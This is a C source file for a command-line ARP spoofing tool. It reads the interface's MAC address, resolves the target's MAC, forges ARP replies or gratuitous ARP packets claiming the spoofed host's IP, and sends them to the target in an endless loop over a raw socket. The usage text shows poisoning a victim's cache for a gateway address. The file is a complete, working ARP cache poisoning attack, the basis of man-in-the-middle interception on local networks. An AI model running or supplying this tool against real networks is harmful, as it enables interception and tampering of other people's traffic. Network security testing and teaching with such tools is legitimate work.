#include <net/if.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <errno.h>

#include "arp.h"

int mac_from_iface(const char* iface_name, struct ether_addr* ether_out)
{
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock < 0) {
		perror("socket()");
		return -1;
	}

	struct ifreq ifr;
	memset((void*) &ifr, 0, sizeof(ifr));

	strncpy(ifr.ifr_name, iface_name, sizeof(ifr.ifr_name));

	if (ioctl(sock, SIOCGIFHWADDR, (void*) &ifr) < 0) {
		perror("ioctl()");
		return -1;
	}

	memcpy(ether_out->ether_addr_octet, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	return 1;
}

void usage()
{
	printf("Usage:\n");
	printf("    arpspoof -i interface -t target_ip -s spoofing_host [-l interval]\n");
	printf("Example:\n");
	printf("    arpspoof -i wlan0 -t 192.168.0.101 -s 192.168.0.1\n");
}

int main(int argc, char* argv[])
{
	if (argc < 7) {
		usage();
		return 0;
	}

	int ifname_idx = -1;
	int targetip_idx = -1;
	int hostip_idx = -1;
	int interval = -1;
	int gratuitous_arp_idx = -1;

	for (int i = 1; i < argc; i++) {
		if (argv[i][0] == '-') {
			switch (argv[i][1]) {
				case 'i' : ifname_idx = ++i;
						   break;
				case 't' : targetip_idx = ++i;
						   break;
				case 's' : hostip_idx = ++i;
						   break;
				case 'l' : interval = atoi(argv[++i]);
						   break;
				case 'g' : gratuitous_arp_idx = ++i; 
			}
		}
	}

	if (ifname_idx < 0 || targetip_idx < 0 || hostip_idx < 0) {
		usage();
		return 0;
	}

	if (interval < 0)
		interval = 1000;

	struct ether_addr iface_hwaddr;
	if (mac_from_iface(argv[ifname_idx], &iface_hwaddr) < 0) {
		return -1;
	}

	struct ether_addr target_hwaddr;
	if (find_mac_addr(inet_addr(argv[targetip_idx]), argv[ifname_idx], &target_hwaddr) < 0) {
		return -1;
	}

	char sendr_mac[18]; /* e.g. 'aa:bb:cc:11:22:33' = 17 chars + \0 = 18 chars */
	char target_mac[18];

	memset(sendr_mac, 0, sizeof(sendr_mac));
	memset(target_mac, 0, sizeof(target_mac));

	strncpy(sendr_mac, ether_ntoa(&iface_hwaddr), sizeof(sendr_mac));
	strncpy(target_mac, ether_ntoa(&target_hwaddr), sizeof(target_mac));

	struct arp_packet* arp;
	if( gratuitous_arp_idx > 0 ){
		if(strncmp(argv[gratuitous_arp_idx], "q", 1) == 0){
			printf(" gratuitous arp request : %s\n", argv[gratuitous_arp_idx]);
			arp = create_arp_packet("ff:ff:ff:ff:ff:ff", sendr_mac,
					ARPOP_REQUEST, sendr_mac, argv[hostip_idx],
					"00:00:00:00:00:00", argv[hostip_idx]);
		}else if(strncmp(argv[gratuitous_arp_idx], "p", 1) == 0){
			printf(" gratuitous arp reply : %s\n", argv[gratuitous_arp_idx]);
			arp = create_arp_packet("ff:ff:ff:ff:ff:ff", sendr_mac,
					ARPOP_REPLY, sendr_mac, argv[hostip_idx],
					"00:00:00:00:00:00", argv[hostip_idx]);
		}
	}else{
		arp = create_arp_reply_packet(sendr_mac, argv[hostip_idx], target_mac, argv[targetip_idx]);
	}

	int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0) {
		perror("socket()");
		return -1;
	}

	int if_idx = if_nametoindex(argv[ifname_idx]);
	if (if_idx == 0) {
		perror("if_nametoindex()");
		return -1;
	}

	printf(" Start Sending ARP Spoof Packet, Packet Interval %d us \n", interval);
	long cnt=0;
	while (1) {
		if (send_arp_to(arp, sock, if_idx) > 0) {
			printf("\r send NO. %ld ARP: %s is at %s --to-> %s", ++cnt, argv[hostip_idx], sendr_mac, 
					argv[targetip_idx]);
		}
		usleep(interval);
	}

	return 0;
}
